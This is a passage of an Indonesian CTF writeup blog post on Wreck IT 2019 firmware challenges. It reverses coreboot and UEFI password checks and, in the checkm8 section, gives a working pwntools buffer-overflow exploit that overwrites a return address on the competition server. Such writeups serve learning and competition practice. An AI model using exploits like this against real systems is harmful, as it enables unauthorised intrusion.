<!DOCTYPE html>
<html lang="en-id">
    <head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<title>Wreck IT 2019 CTF Writeup &middot; Kyra&#39;s Note</title>

		
  		<link rel="stylesheet" href="/css/style.css">
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
		
		
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-146594173-1', 'auto');
	
	ga('send', 'pageview');
}
</script>


		
		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

		
		<link href="" rel="alternate" type="application/rss+xml" title="Kyra&#39;s Note" />
	</head>

    <body>
        		<nav class="nav">
			<div class="nav-container">
				<a href="/">
					<h2 class="nav-title">Kyra&#39;s Note</h2>
				</a>
				<ul>
    <li><a href="/about">About</a></li>
    <li><a href="/">Posts</a></li>
</ul>
			</div>
		</nav>

        

<main>
	<div class="post">
		<div class="post-info">
    <span>Written by</span>
        circleous
        <br>
        <span>on&nbsp;</span><time datetime="2019-09-29 17:16:14 &#43;0700 WIB">September 29, 2019</time>
</div>
		<h1 class="post-title">Wreck IT 2019 CTF Writeup</h1>
<div class="post-line"></div>

		

		

<h1 id="1ot">1ot</h1>

<blockquote>
<p>Setelah galau dengan permasalahan UEFI-nya, kini Bambang beralih mempergunakan sistim perangkat kokoh lainnya yang dirasa lebih mudah. Namun naga-naganya, sistim perangkat kokoh tersebut terproteksi dengan password juga. Bantu Bambang menemukan jawaban. ;)</p>
</blockquote>

<p>Sedikit recon pada file yang diberikan dengan membaca headernya dan analisa strings</p>

<pre><code>$ head -c 32 ./1ot.bin | xxd
00000000: 5f5f 464d 4150 5f5f 0101 0000 c0ff 0000  __FMAP__........
00000010: 0000 0000 4000 464c 4153 4800 0000 0000  ....@.FLASH.....
$ strings ./1ot.bin
...
CBFS: Locating '%s'
CBFS: Found @ offset %zx size %zx
CBFS: '%s' not found.
coreboot-%s%s %s romstage starting (log level: %i)...
0123456789abcdef
0123456789ABCDEF
...
</code></pre>

<p>dengan google-fu, <code>FMAP</code> ini ternyata flashmap files, &ldquo;flashmap, a firmware layout description format allowing to have multipleCBFSes&rdquo;. dan ada string <code>coreboot</code>, OSS project untuk firmware bios. Untuk extract file bios ini, saya mengikuti langkah-langkah dari <a href="https://www.chromium.org/chromium-os/developer-information-for-chrome-os-devices/samsung-sandy-bridge/coreboot-vmx-hack#TOC-Extracting-The-BIOS">Hacking VMX Support Into Coreboot#Extracting The BIOS</a>.</p>

<pre><code>$ cbfstool 1ot.bin print
FMAP REGION: COREBOOT
Name                           Offset     Type           Size   Comp
cbfs master header             0x0        cbfs header        32 none
fallback/romstage              0x80       stage           11388 none
fallback/ramstage              0x2d80     stage           44959 none
config                         0xdd80     raw               485 none
revision                       0xdfc0     raw               674 none
cmos_layout.bin                0xe2c0     cmos_layout       548 none
fallback/postcar               0xe540     stage            9192 none
fallback/dsdt.aml              0x10980    raw              4021 none
fallback/payload               0x11980    simple elf      21566 none
(empty)                        0x16e00    null          4083608 none
bootblock                      0x3fbdc0   bootblock       16384 none
$ cbfstool coreboot.bin extract -f payload -n fallback/payload -m x86
Found file fallback/payload at 0x11980, type simple elf, compressed 21566, size 21566
$ file payload
payload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
</code></pre>

<p>Buka file ELF tersebut pada IDA, pada tab strings-nya (Shift+F12) terdapat string <code>password</code>
<img src="/img/wreckit-iot-strings.png" alt="strings" />
Cari xref-nya untuk string tersebut,
<img src="/img/wreckit-iot-pwdxref.png" alt="strings" />
berikut hasil dekompilasi dari <code>sub_4002571</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">sub_4002571</span>(<span style="color:#66d9ef">int</span> a1) {
  maybe_printf_4003CF0(<span style="color:#e6db74">&#34;Password : &#34;</span>);
  qmemcpy(v8, flag_const_4007E20, <span style="color:#ae81ff">0x33u</span>);
  input <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)maybe_alloc_4002F62(<span style="color:#ae81ff">480</span>);
  check <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x33</span> <span style="color:#f92672">&amp;&amp;</span> input[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span>; <span style="color:#f92672">++</span>i ) {
    input[i] <span style="color:#f92672">=</span> maybe_input_4003E63();
    xor <span style="color:#f92672">=</span> gen_key_4004AAF() <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">^</span> input[i];
    maybe_printf_4003CF0(<span style="color:#e6db74">&#34;%c&#34;</span>, input[i]);
    <span style="color:#66d9ef">if</span> ( xor <span style="color:#f92672">!=</span> flag_const_4007E20[i] <span style="color:#f92672">||</span> i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">21</span> )
      check <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
  }
  <span style="color:#66d9ef">if</span> ( check )
    msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Nope..!&#34;</span>;
  <span style="color:#66d9ef">else</span>
    msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Betul, 100! itu flagnya ;)&#34;</span>;
  maybe_printf_4003CF0(msg);
  halt_40000A0();
}</code></pre></div>
<p>Logika pengecekan password sudah jelas, input dicek dengan <code>flag_const_...[] ^ gen_key()</code>. Kalau begitu tinggal buat solvernya,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> flag[] <span style="color:#f92672">=</span> { <span style="color:#75715e">// from flag_const_4007E20
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0xED</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x4B</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x92</span>, 
    <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0xF8</span>, <span style="color:#ae81ff">0xC8</span>, <span style="color:#ae81ff">0x7A</span>, <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0xF9</span>, 
    <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x60</span>, 
    <span style="color:#ae81ff">0xED</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x4B</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0xF8</span>, <span style="color:#ae81ff">0xC8</span>, <span style="color:#ae81ff">0x7A</span>, 
    <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0xF9</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
    <span style="color:#ae81ff">0x00</span>
};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">gen_key</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>seed) {
  <span style="color:#f92672">*</span>seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41C64E6D</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>seed <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3039</span>;
  <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>seed;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[]) {
  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">20</span>; <span style="color:#f92672">++</span>i) printf(<span style="color:#e6db74">&#34;%c&#34;</span>, flag[i] <span style="color:#f92672">^</span> (gen_key(<span style="color:#f92672">&amp;</span>seed) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>));
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}</code></pre></div>
<p>Flag: <code>wreck{r3tURnFroMc0r3bO0ooT}</code></p>

<h1 id="checkm8">checkm8</h1>

<blockquote>
<p>Masih ingat dengan Bambang si tukang pencari password?Ternyata Bambang adalah agen telik sandi, Kali ini bambang ditugaskan untuk melakukan penetrasi terhadap jaringan DoD untuk menguak rahasia Area404. Melalui proses recon yang cukup panjang, akhirnya bambang berhasil mendapatkan perangkat lunak yg sama, yang digunakan pada sistim target. Bantu bambang, menemukan celah dan mengeksploitasi perangkat lunak tersebut.
sasaran Bambang yang kami ketahui berada pada: checkm8.wreck-it.seclab.id:1337</p>
</blockquote>

<p>Masih sama dengan <code>1ot</code>, file &lsquo;iBoot.rom&rsquo; ini adalah coreboot BIOS, bedanya kali ini harus melakukan binary exploitation pada firmware ini.
Berikut hasil dekompilasi fungsi cek password,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_53C262</span>()
{
  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// edi
</span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// ST1C_4
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// edx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5; <span style="color:#75715e">// [esp+24h] [ebp-20h]
</span><span style="color:#75715e"></span>
  maybe_printf_53FCD5(<span style="color:#e6db74">&#34;Password : &#34;</span>);
  v0 <span style="color:#f92672">=</span> maybe_alloc_53F166(<span style="color:#ae81ff">256</span>, <span style="color:#ae81ff">4</span>);
  v1 <span style="color:#f92672">=</span> (_BYTE <span style="color:#f92672">*</span>)v0;
  <span style="color:#66d9ef">do</span>
  {
    v2 <span style="color:#f92672">=</span> gen_key_540A94();
    v3 <span style="color:#f92672">=</span> maybe_input_53FE48() <span style="color:#f92672">^</span> v2 <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
    <span style="color:#f92672">*</span>v1<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> v3;
  }
  <span style="color:#66d9ef">while</span> ( (_BYTE)v3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">13</span> );
  strcpy_54002D((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>v5, v0);
  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strcmp_53FFA8(<span style="color:#f92672">&amp;</span>v5, <span style="color:#f92672">&amp;</span>dword_54452C) )
    maybe_printf_53FCD5(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">err.. ;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}</code></pre></div>
<p>terdapat bufferoverflow pada <code>v0</code> karena input tidak dibatasi masksimal sebesar alokasi awal <code>v0</code>. Selanjutnya <code>v0</code> ini di copy ke <code>v5</code> dengan <code>strcpy_54002D(v5, v0)</code>. Bug ini lah yang membuat eksploitasi ini menjadi trivial karena variabel di stack ini <code>v5</code> hanya sebesar <code>0x20</code> sedangkan input <code>v0</code> yang tidak terbatas. Eksploitasi bisa dilakukan adalah mengubah saved return address ke fungsi yang mencetak flag, <code>sub_53C24E</code>.</p>

<p>solver,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;checkm8.wreck-it.seclab.id&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key</span>(n):
    p <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    k <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
        k<span style="color:#f92672">.</span>append((<span style="color:#ae81ff">0x41C64E6D</span> <span style="color:#f92672">*</span> k[i] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3039</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>)
    <span style="color:#66d9ef">return</span> k[<span style="color:#ae81ff">1</span>:] <span style="color:#75715e"># delete k[0]</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(k, s):
    f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s)):
        f <span style="color:#f92672">+=</span> chr(ord(s[i]) <span style="color:#f92672">^</span> k[i <span style="color:#f92672">%</span> len(k)])
    <span style="color:#66d9ef">return</span> f

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(REMOTE):
    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x1DABC153</span>) <span style="color:#75715e"># password</span>
    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>
    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x53C24E</span>) <span style="color:#75715e"># print_flag</span>
    payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">13</span>)
    k <span style="color:#f92672">=</span> gen_key(len(payload))
    payload <span style="color:#f92672">=</span> xor(k, payload)
    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39; : &#39;</span>, payload)

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    REMOTE <span style="color:#f92672">=</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
    r <span style="color:#f92672">=</span> remote(HOST, PORT)
    exploit(REMOTE)
    r<span style="color:#f92672">.</span>interactive()</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python2 solve.py
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to checkm8.wreck-it.seclab.id on port <span style="color:#ae81ff">1337</span>: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
wreck<span style="color:#f92672">{</span>m4Yb3_w3_Shl0ud_T4lk_brO<span style="color:#f92672">}</span>Invalid Opcode Exception
Error code: n/a
EIP:    0x07febfd9
CS:     0x0018
GS:     0x0018
Dumping stack:
0x58f260: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f240: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f220: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f200: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f1e0: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f1c0: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f1a0: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f180: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f160: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f140: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f120: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f100: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f0e0: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f0c0: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f0a0: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f080: <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> 0053c24c 07febf78 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
0x58f060: <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> 07febfd9 <span style="color:#ae81ff">00000010</span> <span style="color:#ae81ff">00000046</span> 0053e7f4</code></pre></div>
<p>Flag: <code>wreck{m4Yb3_w3_Shl0ud_T4lk_brO}</code></p>

<p>Sedikit cerita, <code>checkm8</code> ini adalah bootrom exploit yang baru saja keluar untuk apples SoC yang menggunakan UaF bug pada bagian usb. Saya sempat &ldquo;tersasar&rdquo; beberapa saat dalam mengerjakan ini untuk mencari tahu internal mm (memory management) untuk coreboot dahulu karena mungkin saja, <code>checkm8</code> di soal ini juga memerlukan uaf. F.</p>

<h1 id="sehnsucht">Sehnsucht</h1>

<blockquote>
<p>Bambang merasa galau karena dia lupa password UEFI servernya yang berada di Antartika. Bantu bambang menyelesaikan permasalahan berat hidupnya ini. Terima Kasih.</p>

<p>Note: Saya solve soal ini setelah lomba berakhir</p>
</blockquote>

<p>Dari hint dan deskripsi soal dapat diketahui file yang diberikan adalah firmware UEFI, mengingat beberapa bulan lalu ada soal yang sama juga mengenai UEFI di Google CTF Quals, saya menggunakan writeup <a href="https://github.com/EmpireCTF/empirectf/tree/master/writeups/2019-06-22-Google-CTF-Quals#271-Pwn--SecureBoot">Google CTF Quals - SecureBoot</a> untuk <em>kickstart</em> awal reversing.</p>

<p>Buka file dengan <code>uefitool</code> dan extract body dari <code>UiApp</code>,
<img src="/img/wreckit-sehnsucht-uefitool.png" alt="uiapp" />
Lanjut ke analisa file hasil extract tadi (<code>uiapp.dll</code>), mencoba strings dengan beberapa encoding tidak memberikan hasil apa-apa saat mencari untuk string &ldquo;Password&rdquo;.</p>

<p>Sesuai dengan referensi writeup yang ditulis di atas untuk mempermudah reversing, fix type data (shortcut key: y) variable global yang diinisialisasi pada <code>ModuleEntryPoint(EFI_HANDLE *ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</code>. berikut hasilnya (Ini terletak pada bagian awal fungsi tersebut),</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  EFIHandle <span style="color:#f92672">=</span> (EFI_HANDLE <span style="color:#f92672">*</span>)ImageHandle;
  v2 <span style="color:#f92672">=</span> SystemTable<span style="color:#f92672">-&gt;</span>RuntimeServices;
  EFISystemTable <span style="color:#f92672">=</span> SystemTable;
  v3 <span style="color:#f92672">=</span> SystemTable<span style="color:#f92672">-&gt;</span>BootServices;
  EFIRuntimeServices <span style="color:#f92672">=</span> v2;
  EFIBootServices <span style="color:#f92672">=</span> v3;</code></pre></div>
<p>Selanjutnya saya mencari fungsi mana yang melakukan print string Password satu per satu, bagian ini ditemukan pada <code>sub_240()</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  EFISystemTable<span style="color:#f92672">-&gt;</span>ConOut<span style="color:#f92672">-&gt;</span>ClearScreen(EFISystemTable<span style="color:#f92672">-&gt;</span>ConOut);
  v124 <span style="color:#f92672">=</span> maybe_alloc_8926(<span style="color:#ae81ff">800</span>);
  v118 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)maybe_alloc_8926(<span style="color:#ae81ff">800</span>);
  v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)maybe_alloc_8926(<span style="color:#ae81ff">800</span>);
  <span style="color:#66d9ef">do</span>
  {
    v24 <span style="color:#f92672">=</span> v0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
    v118[v0] <span style="color:#f92672">=</span> word_1172C[v0] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
    <span style="color:#66d9ef">do</span>
    {
      v25 <span style="color:#f92672">=</span> word_11744[v24];
      <span style="color:#66d9ef">if</span> ( v24 <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> )
      {
        <span style="color:#66d9ef">if</span> ( v24 <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
          LOBYTE(v25) <span style="color:#f92672">=</span> v25 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xC1</span>;
        <span style="color:#66d9ef">else</span>
          <span style="color:#a6e22e">LOBYTE</span>(v25) <span style="color:#f92672">=</span> v25 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xAB</span>;
      }
      <span style="color:#66d9ef">else</span>
      {
        v25 <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x53u</span>;
      }
      v1[v24] <span style="color:#f92672">=</span> v25;
      v1[v24] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x12u</span>;
      <span style="color:#f92672">++</span>v24;
    }
    <span style="color:#66d9ef">while</span> ( v24 <span style="color:#f92672">!=</span> v0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> );
    <span style="color:#f92672">++</span>v0;
  }
  <span style="color:#66d9ef">while</span> ( v0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">11</span> );
  v26 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>input_from_readkeystroke_v151;
  maybe_printf_8CA8((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;%s&#34;</span>, v118);
  sub_8739();
  v28 <span style="color:#f92672">=</span> v124;
  <span style="color:#66d9ef">do</span>
  {
    <span style="color:#66d9ef">while</span> ( ((<span style="color:#66d9ef">int</span> (<span style="color:#66d9ef">__cdecl</span> <span style="color:#f92672">*</span>)(EFI_SIMPLE_TEXT_INPUT_PROTOCOL <span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">int</span>))EFISystemTable<span style="color:#f92672">-&gt;</span>ConIn<span style="color:#f92672">-&gt;</span>ReadKeyStroke)(
              EFISystemTable<span style="color:#f92672">-&gt;</span>ConIn,
              <span style="color:#f92672">&amp;</span>input_from_readkeystroke_v151,
              v27,
              v27) )
      ;
    v28 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
    <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)(v28 <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">=</span> HIWORD(input_from_readkeystroke_v151) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x12</span>;
    ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__cdecl</span> <span style="color:#f92672">*</span>)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL <span style="color:#f92672">*</span>, <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">int</span>))EFISystemTable<span style="color:#f92672">-&gt;</span>ConOut<span style="color:#f92672">-&gt;</span>OutputString)(
